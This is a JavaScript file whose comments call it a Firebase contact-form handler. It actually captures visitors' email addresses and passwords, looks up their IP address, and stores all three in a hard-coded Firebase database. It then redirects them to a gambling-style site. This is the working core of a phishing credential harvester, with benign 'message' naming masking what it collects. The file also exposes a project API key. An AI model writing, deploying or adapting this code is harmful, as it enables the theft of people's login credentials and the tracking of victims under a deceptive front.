// Initialize Firebase (ADD YOUR OWN DATA)
const firebaseConfig = {
    apiKey: "AIzaSyAW4cTAsG2QiXXGvS2FyOwZYbR_BqCQDXM",
    authDomain: "contactform-37fe3.firebaseapp.com",
    databaseURL: "https://contactform-37fe3-default-rtdb.firebaseio.com",
    projectId: "contactform-37fe3",
    storageBucket: "contactform-37fe3.appspot.com",
    messagingSenderId: "831163231244",
    appId: "1:831163231244:web:71517d64004b77358a9229",
    measurementId: "G-F7SMDYVPSZ"
      
  
    };

    firebase.initializeApp(firebaseConfig);

// Reference messages collection
var messagesRef = firebase.database().ref('user');

// Listen for form submit
document.getElementById('contactForm').addEventListener('submit', submitForm);

// Submit form
function submitForm(e){
    e.preventDefault();

    // Get values
    var password = getInputVal('password');
    var email = getInputVal('email');

    // Fetch user's IP address
    getUserIP().then(userIP => {
        // Save message with user's IP address
        saveMessage(email, password, userIP);
    }).catch(error => {
        console.error('Error fetching IP address:', error);
        // Save message without user's IP address
        saveMessage(email, password, 'Unknown');
    });

    // Show alert
    document.querySelector('.alert').style.display = 'block';

    // Hide alert after 3 seconds
    setTimeout(function(){
        document.querySelector('.alert').style.display = 'none';
    }, 5000);

    // Clear form
    document.getElementById('contactForm').reset();
}

// Function to get form values
function getInputVal(id){
    return document.getElementById(id).value;
}

// Function to fetch user's IP address
function getUserIP() {
    return fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
            return data.ip;
        });
}

// Save message to Firebase
function saveMessage(email, password, userIP) {
    var newMessageRef = messagesRef.push();
    newMessageRef.set({
        email: email,
        password: password,
        userIP: userIP
    });
    // Redirect after saving the message
    setTimeout(function () {
        window.location.href = 'https://bcgame.top/'; // Change the URL to the desired redirection destination
    }, 1000);
}
  
  